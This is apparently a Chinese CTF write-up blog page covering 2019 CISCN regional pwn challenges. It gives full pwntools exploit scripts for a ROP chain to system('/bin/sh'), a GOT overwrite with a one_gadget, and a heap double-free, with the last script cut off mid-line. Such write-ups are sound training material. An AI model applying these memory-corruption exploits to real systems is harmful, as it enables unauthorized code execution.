<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="xrivendell7">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ciscn2019华中赛区区域赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/19/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2025-11-19T12:59:30.937Z" itemprop="datePublished">2025-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2019-CISCN-华中区域赛"><a href="#2019-CISCN-华中区域赛" class="headerlink" title="2019 CISCN 华中区域赛"></a>2019 CISCN 华中区域赛</h1><p>pwn2,pwn7当时不会做，没做出来 pwn3 时间差10分钟没有交上 pwn8 arm的题没见过</p>
<p>所以最后就是5道题交差</p>
<h3 id="pwn1-Emachine-✅"><a href="#pwn1-Emachine-✅" class="headerlink" title="pwn1-Emachine ✅"></a>pwn1-Emachine ✅</h3><p>直接栈溢出 做ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">payload</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">    sel(payload)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload</span>):</span><br><span class="line"></span><br><span class="line">    dede = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(byte) &gt; <span class="number">96</span> <span class="keyword">and</span> <span class="built_in">ord</span>(byte) &lt;=<span class="number">122</span>:</span><br><span class="line">            dede+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte)^<span class="number">0xD</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(byte) &lt;= <span class="number">64</span> <span class="keyword">and</span> <span class="built_in">ord</span>(byte) &gt;<span class="number">90</span>:</span><br><span class="line">            dede+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte)^<span class="number">0xE</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(byte) &gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(byte) &lt;=<span class="number">57</span>:</span><br><span class="line">            dede+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte)^<span class="number">0xF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dede</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">    gdb.attach(io,command)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> de(payload)</span><br><span class="line"></span><br><span class="line">    en(de(payload)+p64(<span class="number">0x400c83</span>)+p64(<span class="number">0x602020</span>)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x400B28</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#z([&#x27;b *0x400AED&#x27;])</span></span><br><span class="line">    ru(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x6f690</span></span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">    en(de(payload)+p64(<span class="number">0x400c83</span>)+p64(binsh)+p64(system))</span><br><span class="line">        io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./Emachine&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./Emachine&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./Emachine&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="pwn2-babycalc-❌"><a href="#pwn2-babycalc-❌" class="headerlink" title="pwn2-babycalc ❌"></a>pwn2-babycalc ❌</h3><p>Binary 实现了一个简单的Calculator，通过三个位于.bss段上的全局变量操作计算器进行运算</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cache = <span class="built_in">malloc</span>(<span class="number">0x21000uLL</span>);</span><br><span class="line">control = <span class="built_in">malloc</span>(<span class="number">0x100uLL</span>);</span><br><span class="line">res = dword_6021B8;</span><br></pre></td></tr></table></figure>

<p>其中cache储存每一次的计算结果，control负责控制程序流程，引导进行add,sub,div,mul等操作 res负责储存上次结果和本次结果</p>
<p>通过在.bss段上的func_list，与加减乘除四种操作的操作顺序共同完成计算器的功能 下面是func_list:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000006020E0 func_list       dq 0                    ; DATA XREF: op+4E↑r</span><br><span class="line">.data:00000000006020E8                 dq offset write_back</span><br><span class="line">.data:00000000006020F0                 dq offset get_value</span><br><span class="line">.data:00000000006020F8                 dq offset ADD_operation</span><br><span class="line">.data:0000000000602100                 dq offset SUB_operation</span><br><span class="line">.data:0000000000602108                 dq offset DIV_operation</span><br><span class="line">.data:0000000000602110                 dq offset initial_space</span><br><span class="line">.data:0000000000602118                 dq offset MUL_operation</span><br><span class="line">.data:0000000000602118 _data           ends</span><br></pre></td></tr></table></figure>

<p>以<code>add</code>的五步操作为例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x20100</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  __isoc99_sscanf(&amp;unk_6020C0, <span class="string">&quot;%c&quot;</span>, &amp;v5);</span><br><span class="line">  *(_DWORD *)STRUC = v5 + <span class="number">0x60000</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x30100</span>;         <span class="comment">// pos</span></span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x20000</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x10100</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  steps = (STRUC - (<span class="type">signed</span> __int64)struc) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>在进行运算时,分别进行五步操作，以STRUC(control)里的内容为控制跳转和参数，0x20100 即运行<code>get_value(0x0,0x1)</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)steps;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= steps )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v0 = *(_DWORD *)(<span class="number">4LL</span> * i + STRUC);</span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD))func_list[*(_DWORD *)(<span class="number">4LL</span> * i + STRUC) &gt;&gt; <span class="number">16</span>])(</span><br><span class="line">    <span class="built_in">BYTE1</span>(v0),</span><br><span class="line">    (<span class="type">unsigned</span> __int8)*(_DWORD *)(<span class="number">4LL</span> * i + STRUC));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>综合下来，五步操作十分类似CPU运行一条指令的五个步骤:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">取值get_value-&gt;译码initial_space-&gt;执行operation-&gt;取值get_value-&gt;写回write_back</span><br></pre></td></tr></table></figure>

<p>上述是对babycalc逆向的过程，漏洞点有点隐蔽，在输入folumla长度的判断上:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &lt;= <span class="number">0x30</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(formula, <span class="number">0</span>, <span class="number">0x30uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input formula to calc:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; size - <span class="number">1</span> &gt;= i; ++i )           <span class="comment">// overflow</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="type">void</span> *)((<span class="type">signed</span> <span class="type">int</span>)i + <span class="number">0x602160LL</span>), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( formula[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      size = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>当size为0时，size-1&lt;0，可以无限制输入，实现在.bss段上的无限长写 利用的思路就是通过程序中提供的写操作，将<code>free</code>写成<code>puts</code>实现泄露 再将<code>malloc</code>写成<code>one_gadget</code>拿到shell.</p>
<p>至于为什么是写<code>malloc</code>，经过尝试了很多，只有在<code>malloc</code>这里，onegadget成功了</p>
<p>当然肯定有劫持的其他方法，因为.bss段的无限制写使我们可以控制babycalc控制运算的三个全局变量，只是构造有些繁琐，就取巧了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;137&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">        gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">size,formula</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size of your formula:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input formula to calc:\n&#x27;</span>)</span><br><span class="line">    p.send(formula)</span><br><span class="line"><span class="comment"># calc(5,&quot;10+20&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow to leaking libc</span></span><br><span class="line">payload = <span class="string">&quot;&#123;0&#125;.0&quot;</span>.<span class="built_in">format</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">calc(<span class="number">0</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Invalid input ..\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Invalid input ..\n&#x27;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one = libc.address+<span class="number">0x45216</span></span><br><span class="line"><span class="comment">#one = libc.address+0x4526a</span></span><br><span class="line"><span class="comment">#one = libc.address+0xf02a4</span></span><br><span class="line"><span class="comment">#one = libc.address+0xf1147</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x400D9D\n b*0x400C29\n b*0x400C67&#x27;)</span></span><br><span class="line"><span class="comment"># problem</span></span><br><span class="line">formula = <span class="string">&quot;&#123;0&#125;+&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(one&amp;<span class="number">0xffffffff</span>),<span class="built_in">str</span>((one&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">payload = formula</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;malloc&quot;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">calc(<span class="number">0</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn3-weapon-✅"><a href="#pwn3-weapon-✅" class="headerlink" title="pwn3-weapon ✅"></a>pwn3-weapon ✅</h3><p>常规的double free劫持<code>__malloc_hook</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,name</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;Give me the name: \n&#x27;</span>)</span><br><span class="line">    se(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">&#x27;index: \n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fight</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">&#x27;weapon:\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bookdoor</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    ru(<span class="string">&quot;weapon:\n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">    create(<span class="number">0x100</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fight(<span class="number">1</span>)</span><br><span class="line">    fight(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&#x27;attack_times: &#x27;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(rud(<span 